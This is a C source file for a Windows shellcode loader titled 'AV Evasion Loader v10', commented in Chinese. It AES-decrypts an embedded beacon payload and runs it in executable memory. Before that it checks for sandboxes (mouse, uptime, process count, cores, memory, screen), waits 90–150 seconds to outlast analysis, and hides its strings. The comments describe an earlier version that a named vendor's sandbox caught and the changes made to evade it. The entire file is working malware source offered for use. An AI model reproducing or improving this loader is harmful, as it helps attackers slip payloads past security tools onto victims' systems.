#include <windows.h>
#include <tlhelp32.h>
#include <stdlib.h>

// ============================================================
//  AV Evasion Loader v10 — AES + 强化反沙箱 + 时间延迟
//
//  v9 被微步完整镜像 (Win10 1903 + Office2016) 绕过: 鼠标/时长/进程
//  三项检测全不命中。v10 强化:
//    1) 反沙箱加维度: CPU 核数 / 物理内存 / 屏幕分辨率
//    2) 时间延迟: 解密前随机 Sleep 90~150 秒, 逃逸沙箱分析窗口
//    3) 保留 v9 全部 (AES-256-CBC + BCrypt 动态解析)
//
//  不做硬件 VM 检测 (CPUID/VMware/VBox), 避免误杀用户自建 VM。
// ============================================================

typedef LONG NTSTATUS;
#define STATUS_SUCCESS ((NTSTATUS)0x00000000)

// ---- BCrypt 函数类型 (动态解析) ----
typedef NTSTATUS (NTAPI *pBCryptOpenAlgorithmProvider)(
    void **phAlgorithm, LPCWSTR pszAlgId, LPCWSTR pszImplementation, ULONG dwFlags);
typedef NTSTATUS (NTAPI *pBCryptSetProperty)(
    void *hObject, LPCWSTR pszProperty, const UCHAR *pbInput,
    ULONG cbInput, ULONG dwFlags);
typedef NTSTATUS (NTAPI *pBCryptGenerateSymmetricKey)(
    void *hAlgorithm, void **phKey, UCHAR *pbKeyObject,
    ULONG cbKeyObject, const UCHAR *pbSecret, ULONG cbSecret, ULONG dwFlags);
typedef NTSTATUS (NTAPI *pBCryptDecrypt)(
    void *hKey, UCHAR *pbInput, ULONG cbInput, void *pPaddingInfo,
    UCHAR *pbIV, ULONG cbIV, UCHAR *pbOutput, ULONG cbOutput, ULONG *pcbResult, ULONG dwFlags);
typedef NTSTATUS (NTAPI *pBCryptDestroyKey)(void *hKey);
typedef NTSTATUS (NTAPI *pBCryptCloseAlgorithmProvider)(void *hAlgorithm, ULONG dwFlags);

// ============================================================
//  字符串加密 (0x5A)
// ============================================================
#define XOR_KEY 0x5A

static inline void DecryptStr(const BYTE* enc, char* dec, SIZE_T maxLen) {
    volatile SIZE_T i;
    for (i = 0; i < maxLen - 1 && enc[i] != 0; i++) {
        dec[i] = (char)(enc[i] ^ XOR_KEY);
    }
    dec[i] = '\0';
}

static const BYTE enc_bcrypt[] = { 'b'^0x5A, 'c'^0x5A, 'r'^0x5A, 'y'^0x5A, 'p'^0x5A, 't'^0x5A, '.'^0x5A, 'd'^0x5A, 'l'^0x5A, 'l'^0x5A, 0^0x5A };

static const wchar_t AES_ALG[]   = L"AES";
static const wchar_t CHAIN_CBC[] = L"ChainingModeCBC";
static const wchar_t PROP_CHAIN[] = L"ChainingMode";

// ============================================================
//  反沙箱检测 (强化版)
// ============================================================

// 鼠标 4 秒无移动
static BOOL MouseStatic(void) {
    POINT a, b;
    if (!GetCursorPos(&a)) return FALSE;
    for (int i = 0; i < 16; i++) {
        Sleep(250);
        if (!GetCursorPos(&b)) return FALSE;
        if (a.x != b.x || a.y != b.y) return FALSE;
    }
    return TRUE;
}

// 系统运行时间 < 15 分钟
static BOOL LowUptime(void) {
    return GetTickCount64() < 15ull * 60 * 1000;
}

// 进程总数过少 (< 40)
static BOOL FewProcesses(void) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return FALSE;
    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(pe);
    int n = 0;
    if (Process32FirstW(snap, &pe)) {
        do { n++; } while (Process32NextW(snap, &pe) && n < 300);
    }
    CloseHandle(snap);
    return n < 40;
}

// CPU 核数过少 (< 2)
static BOOL FewCores(void) {
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    return si.dwNumberOfProcessors < 2;
}

// 物理内存过小 (< 2GB)
static BOOL LowMemory(void) {
    MEMORYSTATUSEX ms;
    ms.dwLength = sizeof(ms);
    if (!GlobalMemoryStatusEx(&ms)) return FALSE;
    return ms.ullTotalPhys < (2ull * 1024 * 1024 * 1024);
}

// 屏幕分辨率过小 (< 800x600)
static BOOL TinyScreen(void) {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    return (w < 800) || (h < 600);
}

// 组合评分: 命中 >= 3 项 => 疑似沙箱 (阈值提高, 降低误杀)
static BOOL AntiSandbox(void) {
    int score = 0;
    if (MouseStatic())  score++;
    if (LowUptime())    score++;
    if (FewProcesses()) score++;
    if (FewCores())     score++;
    if (LowMemory())    score++;
    if (TinyScreen())   score++;
    return score >= 3;
}

// ============================================================
//  内嵌 AES 密文载荷 (由 encrypt_aes.py 生成)
// ============================================================
#include "payload_v8.h"

// ============================================================
//  主函数
// ============================================================
int main() {
    // ---- Step 0: 反沙箱 (命中直接退出) ----
    if (AntiSandbox()) return 0;

    // ---- Step 1: 时间延迟 90~150 秒 (逃逸沙箱分析窗口) ----
    // 随机种子来自时间; 正常目标多等 ~2 分钟上线
    srand((unsigned)GetTickCount());
    int delay = 90 + (rand() % 61); // 90..150
    Sleep((DWORD)delay * 1000);

    // ---- Step 2: 动态解析 BCrypt ----
    char bcryptName[16];
    DecryptStr(enc_bcrypt, bcryptName, sizeof(bcryptName));

    HMODULE hBcrypt = LoadLibraryA(bcryptName);
    SecureZeroMemory(bcryptName, sizeof(bcryptName));
    if (!hBcrypt) return 0;

    pBCryptOpenAlgorithmProvider fnOpen = (pBCryptOpenAlgorithmProvider)GetProcAddress(hBcrypt, "BCryptOpenAlgorithmProvider");
    pBCryptSetProperty fnSetProp = (pBCryptSetProperty)GetProcAddress(hBcrypt, "BCryptSetProperty");
    pBCryptGenerateSymmetricKey fnGenKey = (pBCryptGenerateSymmetricKey)GetProcAddress(hBcrypt, "BCryptGenerateSymmetricKey");
    pBCryptDecrypt fnDecrypt = (pBCryptDecrypt)GetProcAddress(hBcrypt, "BCryptDecrypt");
    pBCryptDestroyKey fnDestroyKey = (pBCryptDestroyKey)GetProcAddress(hBcrypt, "BCryptDestroyKey");
    pBCryptCloseAlgorithmProvider fnClose = (pBCryptCloseAlgorithmProvider)GetProcAddress(hBcrypt, "BCryptCloseAlgorithmProvider");

    if (!fnOpen || !fnSetProp || !fnGenKey || !fnDecrypt || !fnDestroyKey || !fnClose) {
        return 0;
    }

    // ---- Step 3: AES-256-CBC 解密 ----
    SIZE_T ptSize = ENC_BEACON_LEN;
    unsigned char* plain = (unsigned char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ptSize);
    if (!plain) return 0;

    void *hAlg = NULL, *hKey = NULL;
    NTSTATUS st = STATUS_SUCCESS;

    st = fnOpen(&hAlg, AES_ALG, NULL, 0);
    if (st != STATUS_SUCCESS) goto fail;

    st = fnSetProp(hAlg, PROP_CHAIN, (const UCHAR*)CHAIN_CBC, sizeof(CHAIN_CBC), 0);
    if (st != STATUS_SUCCESS) goto fail;

    st = fnGenKey(hAlg, &hKey, NULL, 0, (UCHAR*)aes_key, 32, 0);
    if (st != STATUS_SUCCESS) goto fail;

    UCHAR iv[16];
    memcpy(iv, aes_iv, 16);

    ULONG done = 0;
    st = fnDecrypt(hKey, (UCHAR*)enc_beacon, (ULONG)ENC_BEACON_LEN, NULL,
                   iv, 16, plain, (ULONG)ptSize, &done, 0);
    if (st != STATUS_SUCCESS || done == 0) goto fail;

    if (hKey) fnDestroyKey(hKey);
    if (hAlg) fnClose(hAlg, 0);
    FreeLibrary(hBcrypt);

    SIZE_T payloadLen = done;
    if (payloadLen > 0) {
        BYTE pad = plain[payloadLen - 1];
        if (pad > 0 && pad <= 16 && payloadLen >= pad) {
            payloadLen -= pad;
        }
    }

    // ---- Step 4: 分配执行内存 + 写入 ----
    unsigned char* execBuf = (unsigned char*)VirtualAlloc(
        NULL, payloadLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!execBuf) {
        SecureZeroMemory(plain, ptSize);
        HeapFree(GetProcessHeap(), 0, plain);
        return 0;
    }

    memcpy(execBuf, plain, payloadLen);

    SecureZeroMemory(plain, ptSize);
    HeapFree(GetProcessHeap(), 0, plain);

    DWORD oldProt = 0;
    if (!VirtualProtect(execBuf, payloadLen, PAGE_EXECUTE_READ, &oldProt)) {
        VirtualFree(execBuf, 0, MEM_RELEASE);
        return 0;
    }

    FlushInstructionCache(GetCurrentProcess(), execBuf, payloadLen);

    // ---- Step 5: 执行 ----
    typedef void (*ShellcodeEntry)();
    ShellcodeEntry entry = (ShellcodeEntry)execBuf;
    entry();

    VirtualFree(execBuf, 0, MEM_RELEASE);
    return 0;

fail:
    if (hKey) fnDestroyKey(hKey);
    if (hAlg) fnClose(hAlg, 0);
    FreeLibrary(hBcrypt);
    SecureZeroMemory(plain, ptSize);
    HeapFree(GetProcessHeap(), 0, plain);
    return 0;
}
